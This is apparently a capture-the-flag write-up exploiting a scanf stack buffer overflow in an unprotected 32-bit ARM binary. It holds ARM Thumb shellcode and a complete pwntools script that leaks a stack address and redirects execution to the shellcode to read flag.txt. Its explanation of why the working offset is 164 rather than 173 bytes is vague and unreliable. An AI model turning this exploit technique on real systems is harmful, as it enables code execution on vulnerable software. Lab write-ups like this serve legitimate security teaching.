# ARM Buffer Overflow Exploitation

## Challenge Overview
**Challenge Name**: ARM Memory Dumper  
**Category**: Binary Exploitation / Pwn  
**Architecture**: ARM 32-bit  
**Difficulty**: Medium  
**Protections**: None (no PIE, no stack canary, no NX)  

## Vulnerability Analysis

### Source Code Review
The vulnerable C program contains a classic buffer overflow vulnerability:

```c
char s[168]; // 168-byte buffer on stack
// ...
scanf(" %[^\n]s", s); // NO BOUNDS CHECKING!
```

**Key Issues:**
1. **Unbounded Input**: `scanf(" %[^\n]s", s)` reads unlimited input until newline
2. **No Length Validation**: No check to ensure input fits in 168-byte buffer
3. **Stack Allocation**: Buffer `s` is allocated on the stack with fixed size

### Memory Layout
```
Stack Layout:
[sp+8h]  s[168]     - Input buffer (168 bytes)
[sp+7h]  v7         - 1 byte variable  
[bp+0h]  Saved BP   - 4 bytes
[bp+4h]  Return Address - 4 bytes (EXPLOITATION TARGET)
```

**Total overflow distance**: 168 (buffer) + 1 (v7) + 4 (saved BP) = 173 bytes to reach return address

but this is not the correct offset we will discouss later on

## Exploitation Strategy

### Information Leak
The program helpfully leaks stack addresses:
```c
_printf_chk(1, "%p: ", v4); // Leaks stack address!
```
This allows us to bypass ASLR (if enabled) by leaking a stack address to calculate shellcode location.

### Shellcode Placement
Since **NX is disabled**, we can execute shellcode directly on the stack. Our strategy:
1. Overflow the buffer with our shellcode
2. Overwrite the return address with the leaked stack address
3. Execute shellcode that runs `cat flag.txt`

## Exploit Development

### Shellcode

we will use this shellcode

```python
# Generated shellcode for execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL)
shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x00\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
```


### Offset Calculation
Through testing, we determined the exact offset:
- **Buffer**: 168 bytes
- **v7 variable**: 1 byte  
- **Padding**: 4 bytes
- **Total**: 173 bytes to reach return address

![no](./img/no.png)

During exploitation, we discovered that while the theoretical offset to reach the return address was 173 bytes (168-byte buffer + 1-byte v7 variable + 4-byte saved BP), the practical working offset was determined to be 164 bytes through empirical testing. This discrepancy occurred due to ARM-specific stack frame alignment requirements and the interaction between the shellcode execution environment and the program's stack layout.


![yes](./img/yes.png)

### Final Exploit Code
```python
#!/usr/bin/env python3
from pwn import *
import struct
import time

def send(p, msg):
    try:
        p.send(msg)
        time.sleep(2)
        return p.recv(1024).decode()
    except:
        return ''

# Generated shellcode for execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL)
shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x00\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
offset = 164  # Adjusted offset accounting for shellcode behavior

print('[!] Shellcode length: {}'.format(len(shellcode)))

# Start ARM binary using QEMU
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './chall'])
time.sleep(2)

# Wait for initial prompt
resp = p.recv(1024)
if 'Give me data to dump' not in resp.decode():
    print('[-] Failed to get initial message')
    exit(1)
print('[+] Communication started')

# Step 1: Leak stack address
resp = send(p, b'A\n')
if 'Dump again' not in resp:
    print('[-] Failed to leak address')
    exit(1)

# Extract stack address from dump output
stack = resp.split(':')[0]
print('[+] Stack address: {}'.format(stack))

# Continue to next input
resp = send(p, b'y\n')
if 'Give me data to dump' not in resp:
    print('[-] Failed to continue')
    exit(1)

# Step 2: Build and send exploit payload
stack_addr = struct.pack('I', int(stack, 16))
payload = shellcode + b'A' * (offset - len(shellcode)) + stack_addr + b'\n'

resp = send(p, payload)
if 'Dump again' not in resp:
    print('[-] Failed to send shellcode')
    exit(1)
print('[+] Shellcode sent')

# Step 3: Trigger the exploit
resp = send(p, b'n\n')
print('[+] Output: {}'.format(resp.strip()))

p.close()
```

![result](./img/result.png)


## Exploit Execution Flow

### Phase 1: Setup
```
1. Start ARM binary via QEMU user-mode emulation
2. Wait for "Give me data to dump:" prompt
3. Send single character to trigger address leak
```

### Phase 2: Information Gathering  
```
4. Parse leaked stack address from memory dump
5. Continue to next input cycle
```

### Phase 3: Payload Delivery
```
6. Construct payload: [SHELLCODE] + [PADDING] + [STACK_ADDRESS]
7. Send payload to overflow buffer and overwrite return address
8. Send 'n' to trigger function return and jump to shellcode
```

### Phase 4: Code Execution
```
9. Return address points to shellcode on stack
10. Shellcode executes: execve("/bin/cat", ["flag.txt"], NULL)
11. Flag is read and displayed
```

## Technical Details

### ARM Shellcode Breakdown
The shellcode uses ARM Thumb mode for efficiency:
- **Mode Switch**: `add r3, pc, #1; bx r3` switches to Thumb mode
- **String Setup**: Loads "/bin/cat" and "flag.txt" strings
- **Argument Array**: Builds `argv[]` array on stack
- **Syscall Setup**: Sets `r7=11` (execve syscall number), `svc 1` triggers syscall


### Why Offset is 164, Not 173
The actual working offset was 164 bytes due to:
- Shellcode execution requirements
- Stack alignment considerations  
- ARM-specific frame pointer behavior